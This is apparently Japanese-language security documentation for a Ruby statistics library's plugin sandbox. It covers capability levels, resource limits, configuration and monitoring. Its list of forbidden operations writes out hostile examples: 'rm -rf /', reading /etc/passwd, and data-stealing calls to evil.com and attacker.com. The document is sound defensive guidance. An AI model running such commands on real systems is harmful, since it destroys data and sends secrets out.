# NumberAnalyzer Security Guidelines

## Overview

NumberAnalyzerは企業環境での使用を想定した統計分析ライブラリです。プラグインシステムを通じて機能拡張が可能ですが、セキュリティを重視した設計により、安全な実行環境を提供します。

## Plugin Security Model

### **セキュリティ原則**

1. **Principle of Least Privilege**: プラグインは必要最小限の権限のみを持つ
2. **Defense in Depth**: 複数の防御レイヤーによる多層防御
3. **Fail Secure**: セキュリティ違反時は安全な状態に移行
4. **Transparency**: セキュリティポリシーの明確な開示

### **3層セキュリティアーキテクチャ**

```
Application Layer
├── Layer 3: Capability Security (権限ベース制御)
├── Layer 2: Resource Control (リソース制限)  
└── Layer 1: Method Interception (メソッドレベル制御)
```

## Plugin Development Guidelines

### **✅ 許可される操作**

#### **基本的な数学演算**
```ruby
# ✅ 安全 - 基本演算子
result = [1, 2, 3, 4, 5].sum
average = result / 5.0
power = 2 ** 3

# ✅ 安全 - 数学関数
Math.sqrt(16)     # => 4.0
Math.sin(Math::PI / 2)  # => 1.0
```

#### **配列・ハッシュ操作**
```ruby
# ✅ 安全 - 読み取り専用操作
data = [1, 2, 3, 4, 5]
data.map { |x| x * 2 }
data.select { |x| x > 3 }
data.reduce(:+)

# ✅ 安全 - 基本的なハッシュ操作
hash = { a: 1, b: 2, c: 3 }
hash.keys
hash.values
hash.each_pair { |k, v| puts "#{k}: #{v}" }
```

#### **文字列操作**
```ruby
# ✅ 安全 - 基本的な文字列処理
text = "Hello, World!"
text.upcase
text.gsub(/world/i, "Ruby")
text.split(",")
```

#### **統計計算**
```ruby
# ✅ 安全 - 統計分析メソッド
NumberAnalyzer.mean([1, 2, 3, 4, 5])
NumberAnalyzer.median(data)
NumberAnalyzer.correlation(x_data, y_data)
```

### **❌ 禁止される操作**

#### **動的コード実行**
```ruby
# ❌ 危険 - 動的コード実行は禁止
eval("malicious_code")           # SecurityError
instance_eval("system('rm -rf')")  # SecurityError
class_eval("dangerous_method")    # SecurityError
```

#### **システムコマンド実行**
```ruby
# ❌ 危険 - システムコマンドは禁止
system("curl http://evil.com")    # SecurityError
exec("rm -rf /")                  # SecurityError
`ls -la`                         # SecurityError
Process.spawn("malware")         # SecurityError
```

#### **ファイルシステムアクセス**
```ruby
# ❌ 危険 - 直接的なファイルアクセスは禁止
File.read("/etc/passwd")         # SecurityError
Dir.glob("**/*")                 # SecurityError
IO.read("sensitive_file.txt")    # SecurityError

# ✅ 代替案 - プラグインAPIを使用
plugin_api.read_data_file("input.csv")  # OK (権限があれば)
```

#### **ネットワークアクセス**
```ruby
# ❌ 危険 - 直接的なネットワークアクセスは禁止
Net::HTTP.get("evil.com", "/steal-data")  # SecurityError
TCPSocket.open("attacker.com", 80)        # SecurityError

# ✅ 代替案 - 許可されたAPIエンドポイントのみ
plugin_api.fetch_data("https://api.allowed-domain.com/data")  # OK (権限があれば)
```

#### **メタプログラミング**
```ruby
# ❌ 危険 - 動的メソッド定義/呼び出しは禁止
send(:dangerous_method)           # SecurityError
define_method(:backdoor) { }      # SecurityError
remove_method(:security_check)    # SecurityError
```

## Resource Limitations

### **制限値一覧**

| リソース | デフォルト制限 | 説明 |
|---------|---------------|------|
| **CPU時間** | 5秒 | プラグインの最大実行時間 |
| **メモリ** | 100MB | プラグインが使用可能な最大メモリ |
| **出力サイズ** | 1MB | プラグインが生成可能な最大出力 |
| **スタック深度** | 100 | 再帰呼び出しの最大深度 |

### **制限違反時の動作**

```ruby
# CPU時間制限を超過した場合
begin
  result = plugin.execute_heavy_computation
rescue NumberAnalyzer::PluginTimeoutError => e
  puts "Plugin execution timed out: #{e.message}"
end

# メモリ制限を超過した場合  
begin
  huge_array = Array.new(1_000_000_000, "x")
rescue NumberAnalyzer::PluginResourceError => e
  puts "Memory limit exceeded: #{e.message}"
end
```

## Capability-based Security

### **権限レベル**

#### **Level 1: Basic (基本権限)**
- データの読み取り
- 基本的な統計計算
- 結果の出力

```ruby
# プラグインメタデータで宣言
def self.required_capabilities
  [:read_data, :write_output]
end
```

#### **Level 2: File Access (ファイルアクセス)**
- 指定されたディレクトリからのファイル読み取り
- 一時ファイルの作成

```ruby
def self.required_capabilities
  [:read_data, :write_output, :file_read]
end

# 制限されたパスのみアクセス可能
plugin_api.read_file("./data/input.csv")    # OK
plugin_api.read_file("/etc/passwd")         # Error
```

#### **Level 3: Network Access (ネットワークアクセス)**
- 許可されたホストへのHTTPリクエスト
- APIデータの取得

```ruby
def self.required_capabilities
  [:read_data, :write_output, :network_access]
end

# ホワイトリストに登録されたURLのみ
plugin_api.http_get("https://api.example.com/data")  # OK
plugin_api.http_get("https://evil.com")              # Error
```

#### **Level 4: External Commands (外部コマンド)**
- 許可された外部プログラムの実行
- R、Python等の統計ソフトウェア連携

```ruby
def self.required_capabilities
  [:read_data, :write_output, :external_command]
end

# 許可されたコマンドのみ実行可能
plugin_api.execute_command("R", ["--vanilla", "-f", "script.R"])  # OK (Rが許可されている場合)
plugin_api.execute_command("rm", ["-rf", "/"])                    # Error
```

## Security Configuration

### **設定ファイル例**

```yaml
# config/security.yml
plugin_security:
  # セキュリティレベル設定
  environment:
    development:
      sandbox_enabled: false      # 開発時は無効化可能
      log_violations: true       # 違反をログ出力
    
    test:
      sandbox_enabled: true      # テスト環境では部分的制限
      method_whitelist: standard
      
    production:
      sandbox_enabled: true      # 本番環境では完全制限
      method_whitelist: strict
      
  # リソース制限
  resource_limits:
    cpu_time: 5.0               # 秒
    memory: 100_000_000         # バイト
    output_size: 1_000_000      # 文字数
    
  # 信頼されたプラグイン
  trusted_plugins:
    - "core_statistics"
    - "data_visualization"
    
  # 権限設定
  capabilities:
    auto_approval:              # 自動承認される権限
      - read_data
      - write_output
    requires_review:            # 手動承認が必要な権限
      - file_read
      - network_access
      - external_command
      
  # ネットワークアクセス制御
  network_access:
    allowed_hosts:
      - "api.example.com"
      - "data.government.gov"
    blocked_hosts:
      - "*.suspicious-domain.com"
      
  # ファイルアクセス制御
  file_access:
    allowed_paths:
      - "./data"
      - "./input"
      - "/tmp/number_analyzer"
    blocked_paths:
      - "/etc"
      - "/usr"
      - "~/.ssh"
```

## Plugin Development Best Practices

### **セキュアなプラグイン設計**

#### **1. 最小権限の原則**
```ruby
class MyPlugin < NumberAnalyzer::BasePlugin
  # 必要最小限の権限のみ要求
  def self.required_capabilities
    [:read_data, :write_output]  # file_readは本当に必要な場合のみ
  end
  
  def analyze(data)
    # プラグインAPIを通じて安全にデータアクセス
    input_data = plugin_api.get_input_data
    
    # 直接的なファイルアクセスは避ける
    # File.read("data.csv")  # ❌ 危険
    
    result = perform_analysis(input_data)
    plugin_api.output_result(result)
  end
end
```

#### **2. エラーハンドリング**
```ruby
def safe_calculation(data)
  return { error: "No data provided" } if data.empty?
  
  begin
    result = complex_calculation(data)
    
    # 結果の妥当性チェック
    return { error: "Invalid result" } unless result.is_a?(Numeric)
    
    { success: true, result: result }
  rescue StandardError => e
    # 機密情報を含まないエラーメッセージ
    { error: "Calculation failed", type: e.class.name }
  end
end
```

#### **3. 入力検証**
```ruby
def validate_input(data)
  unless data.is_a?(Array)
    raise ArgumentError, "Data must be an array"
  end
  
  unless data.all? { |item| item.is_a?(Numeric) }
    raise ArgumentError, "All data items must be numeric"
  end
  
  if data.size > 1_000_000
    raise ArgumentError, "Dataset too large (max: 1M items)"
  end
  
  true
end
```

## Security Monitoring

### **ログ出力例**

```ruby
# セキュリティ違反のログ
[2025-01-13 10:30:15] SECURITY_VIOLATION plugin="untrusted_plugin" method="eval" 
  message="Dynamic code evaluation attempted"
  
[2025-01-13 10:30:20] RESOURCE_VIOLATION plugin="memory_hungry_plugin" 
  type="memory_limit" usage="150MB" limit="100MB"
  
[2025-01-13 10:30:25] CAPABILITY_VIOLATION plugin="network_plugin" 
  capability="network_access" status="denied" reason="not_approved"
```

### **監視項目**

- セキュリティ違反の回数と種類
- リソース使用量の傾向
- 権限要求のパターン
- 異常なファイルアクセス試行

## Incident Response

### **セキュリティインシデント対応**

#### **Level 1: 軽微な違反**
- ログ記録
- 警告メッセージ表示
- プラグイン実行継続

#### **Level 2: 中程度の違反**
- プラグイン実行停止
- 管理者通知
- 一時的なプラグイン無効化

#### **Level 3: 重大な違反**
- システム緊急停止
- セキュリティチーム通知
- フォレンジック調査の開始

### **緊急時連絡先**

```yaml
# config/security_contacts.yml
security_contacts:
  security_team: "security@example.com"
  incident_response: "incident@example.com"
  emergency_phone: "+1-xxx-xxx-xxxx"
```

## Compliance & Auditing

### **コンプライアンス要件**

- **SOX法対応**: 財務データ処理時の監査ログ
- **GDPR対応**: 個人データ処理の同意管理
- **HIPAA対応**: 医療データの暗号化と制限

### **監査ログ**

```ruby
# 監査ログの例
audit_log = {
  timestamp: "2025-01-13T10:30:15Z",
  plugin: "financial_analysis",
  action: "data_processing",
  user: "analyst@company.com",
  data_classification: "confidential",
  capabilities_used: ["read_data", "file_read"],
  result: "success"
}
```

## Conclusion

NumberAnalyzerのセキュリティモデルは、柔軟性と安全性のバランスを取りながら、企業環境での安心した利用を可能にします。プラグイン開発者は本ガイドラインに従うことで、セキュアで信頼性の高いプラグインを作成できます。

セキュリティに関する質問や報告は、`security@numberanalyzer.example.com` までご連絡ください。

---

**最終更新**: 2025年1月13日  
**バージョン**: 1.0  
**関連ドキュメント**: [PLUGIN_SANDBOXING_DESIGN.md](PLUGIN_SANDBOXING_DESIGN.md)